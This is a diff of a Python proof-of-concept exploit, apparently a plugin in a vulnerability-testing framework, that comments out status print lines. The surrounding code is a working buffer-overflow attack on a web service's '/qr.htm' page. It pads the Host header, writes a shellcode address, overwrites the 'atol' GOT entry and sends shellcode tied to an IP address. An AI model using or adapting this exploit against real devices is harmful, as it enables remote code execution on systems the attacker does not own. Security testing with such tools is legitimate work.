@@ -44,7 +44,7 @@ class TestPOC(POCBase):
                 fullurl = self.url+path + '?' + parameter
             else:
                 fullurl = self.url+path
-            print (fullurl)
+            # print (fullurl)
             req = urllib2.Request(fullurl, None, headers)
             response = urllib2.urlopen(req)
             data = response.read()
@@ -77,13 +77,13 @@ class TestPOC(POCBase):
             #shellcode_addr = l_host_addr + 0x40
             shellcode_addr = 0x41414141
 
-            print "[+] Sending exploit to ip:%s" % (target_ip)
+            # print "[+] Sending exploit to ip:%s" % (target_ip)
             host_str = host_padding + 'aaaa' + p32(shellcode_addr)
             make_req('/qr.htm', host=host_str)
-            print "[+] Overflowing buffer"
+            # print "[+] Overflowing buffer"
             host_str = host_padding + p32(atol_got_addr)
             make_req('/qr.htm', host=host_str)
-            print "[+] Overwriting got entry"
+            # print "[+] Overwriting got entry"
             make_req('/qr.htm', {'_': 'hello'})   # Write
 
             host_str = 'q'*0x40 + shellcode(ip)
